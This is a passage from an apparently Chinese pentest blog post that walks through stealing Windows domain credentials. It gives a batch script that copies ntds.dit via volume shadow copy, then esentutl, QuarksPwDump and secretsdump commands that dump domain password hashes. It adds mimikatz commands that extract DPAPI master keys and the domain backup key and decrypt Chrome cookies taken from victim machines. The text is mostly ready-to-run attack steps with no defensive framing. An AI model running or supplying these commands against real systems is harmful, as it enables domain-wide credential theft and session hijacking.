+<p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p>
+<p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p>
+<p>QuarksPwDump 下载地址：<a href="https://link.zhihu.com/?target=https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p>
+<p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setlocal</span><br><span class="line">if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK</span><br><span class="line">set SOURCE_DRIVE_LETTER=%SystemDrive%</span><br><span class="line">set SOURCE_RELATIVE_PATH=windows\ntds\ntds.dit</span><br><span class="line">set DESTINATION_PATH=%~dp0</span><br><span class="line">@echo ...Determine the scripts to be executed/generated...</span><br><span class="line">set CALLBACK_SCRIPT=%~dpnx0</span><br><span class="line">set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd</span><br><span class="line">@echo ...Creating the shadow copy...</span><br><span class="line">&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%</span><br><span class="line">del /f %TEMP_GENERATED_SCRIPT%</span><br><span class="line">@goto :EOF</span><br><span class="line">:IS_CALLBACK</span><br><span class="line">setlocal</span><br><span class="line">@echo ...Obtaining the shadow copy device name...</span><br><span class="line">call %TEMP_GENERATED_SCRIPT%</span><br><span class="line">@echo ...Copying from the shadow copy to the destination path...</span><br><span class="line">copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>
+
+<p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://link.zhihu.com/?target=https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p>
+<p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe</span><br></pre></td></tr></table></figure>
+
+<p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p>
+<p>使用 esentutl 修复导出的 ntds.dit 文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt</span><br></pre></td></tr></table></figure>
+
+<p>在 log 里就能看到导出的密码哈希了</p>
+<h5 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h5><p>自己搜吧</p>
+<p>就一个命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<h1 id="dpapi解密"><a href="#dpapi解密" class="headerlink" title="dpapi解密"></a><strong>dpapi解密</strong></h1><h2 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h2><p>​		DPAPI 英文全称：Data Protection API ，顾名思义就是用来保护数据的接口。这个接口在windows中大量的使用来加密数据，比如chrome的cookies和login data。</p>
+<p>​		1.DPAPI 使用了叫做<code>Master Key</code>的东西，用来解密和加密。<code>Master Key</code> 并不会存在在磁盘上，是通过用户的密码HASH加密生成。</p>
+<pre><code>     2.`Master Key` 的第一种实现方式用用户NTLM Hash来加密。由于NTLM Hash在Windows中有着各种重要的作用，而且NTLM Hash是存储在SAM文件中，只要攻击者获取到Hash就可以用来生成`Master Key`来解密数据了。所以为了防止这样的事，就有了第二种：直接用用户密码生成，函数：`SHA‑1(UTF16LE(user_password))` 。
+</code></pre>
+<p>就算攻击者获取到NTLM，如果不能解密出用户的密码不能生成<code>Master Key</code>。</p>
+<p>​		 3.文章中还提到了<code>ARSO</code>和<code>TBAL</code> 。ARSO 英文全称：Automatic Restart Sign-On 。TBAL 文中作者猜测AL是Auto Logon，不清楚TB什么意思。但是评论中有个猜测是Trusted Boot Auto Logon。都是在WIndows 8和Windows 10中才添加的新特性，就是保存了用户会话，恢复到重启之前的状态，也就是在重启之前密码都保存在磁盘中，具体可以看看文章的详细说明。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最后生成就是 用户密码SHA-1 hash的值 随机16位的salt 重复至少4k次 可以在注册表来修改</span><br></pre></td></tr></table></figure>
+
+<h2 id="DPAPI的利用"><a href="#DPAPI的利用" class="headerlink" title="DPAPI的利用"></a>DPAPI的利用</h2><p>本地用户登录时，解密Cookies：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;%localappdata%GoogleChromeUser DataDefaultCookies&quot; /unprotect</span><br></pre></td></tr></table></figure>
+
+<p>如果通过某些方式从其它电脑获取到cookie到本地：</p>
+<p>先执行上面这条命令看看，会报错：</p>
+<p>提示需要GUID {219d25e6-27f5-4754-8bcb-2aa77df53b68} 这个用户的<code>Master key</code>才能解密，所以在你拿回这个cookie文件时，要把那个机器的masterkey导出一下，两个命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">你猴桃 俩命令</span><br><span class="line">privilege::debug </span><br><span class="line">sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">干就完了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dpapi::chrome /in:&quot;c:tempCookies&quot; /masterkey:masterkey值 /unprotect  #谷歌的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">而如果是域用户的话，是由域用户的master key就是由域的DPAPI key来保护的，`lsadump::backupkeys /system:DC CONTROLLER /export`会得到一个PVK文件，可以用来解密所有域用户的Master Key，而且这个key是不会改变的。</span><br><span class="line">`dpapi::masterkey /in:&quot;C:UsersxxxxxAppDataRoamingMicrosoftProtectsid值ca748af3–8b95–40ae-8134-cb9534762688&quot; /pvk</span><br><span class="line">:导出的PVK文件`这里就可以解密得到域用户的Master Key值。然后跟上面一样</span><br><span class="line">`dpapi::chrome /in:Cookies /masterkey:a3fv34aedd7...`，这样就能解密Cookies的内容了。</span><br></pre></td></tr></table></figure>
 
 
                 
